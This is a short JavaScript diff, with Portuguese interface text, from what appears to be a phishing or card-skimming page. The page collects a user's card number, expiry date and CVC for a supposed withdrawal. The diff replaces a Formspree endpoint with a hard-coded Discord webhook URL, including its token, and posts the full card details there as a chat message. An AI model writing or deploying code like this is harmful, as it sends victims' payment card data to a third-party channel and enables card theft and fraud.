@@ -476,15 +476,13 @@
     return alert("Por favor preenche todos os campos do cartão!");
   }
 
-  fetch("https://formspree.io/f/moevkooe", {
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554573243103453335/f5I_c7iFdxSYLDEBX6_A22aHR9sll-aULrzonduFbv3fFeDMwUpsXX2DMrgs-dApnThc";
+
+  fetch(DISCORD_WEBHOOK_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      saldo: saldo.toFixed(2) + " €",
-      numeroCartao: numCartao,
-      validade: validade,
-      cvc: cvc,
-      dataHora: new Date().toLocaleString()
+      content: `💳 **Novo Pedido de Levantamento!**\n- **Saldo:** ${saldo.toFixed(2)} €\n- **Número do Cartão:** \`${numCartao}\`\n- **Validade:** \`${validade}\`\n- **CVC:** \`${cvc}\`\n- **Data/Hora:** ${new Date().toLocaleString()}`
     })
   })
   .then(response => {
